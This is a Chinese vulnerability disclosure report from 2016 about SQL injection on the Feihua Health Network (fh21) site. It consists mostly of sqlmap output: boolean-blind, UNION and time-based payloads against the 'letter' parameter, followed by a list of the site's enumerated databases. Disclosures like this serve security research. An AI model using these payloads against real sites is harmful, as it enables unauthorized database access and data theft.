wybug_title: 飞花健康网/全站注入/涉及多个分站
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2016-02-04：	细节已通知厂商并且等待厂商处理中									2016-02-22：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： RT 详细说明：  
sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: letter    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: letter=a' AND 5296=5296 AND 'xjHk'='xjHk    Type: UNION query    Title: MySQL UNION query (NULL) - 17 columns    Payload: letter=a' LIMIT 1,1 UNION ALL SELECT NULL, CONCAT(0x3a646a743a,0x595a6f6f686f6e697052,0x3a656a623a), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL#    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: letter=a' AND SLEEP(5) AND 'jPSi'='jPSi---[21:06:53] [INFO] the back-end DBMS is MySQLback-end DBMS: MySQL 5.0.11[21:06:53] [INFO] fetching database namesavailable databases [14]:[*] #mysql50#mysql-bin[*] fh21_bbs[*] fh21_blog[*] fh21_online[*] fh21_test[*] fh21_www[*] fh21_yisou[*] fh21_ypk[*] fh21_yqk[*] fh21_zzk[*] information_schema[*] mysql[*] performance_schema[*] test
   漏洞证明：  我就不多说什么了。
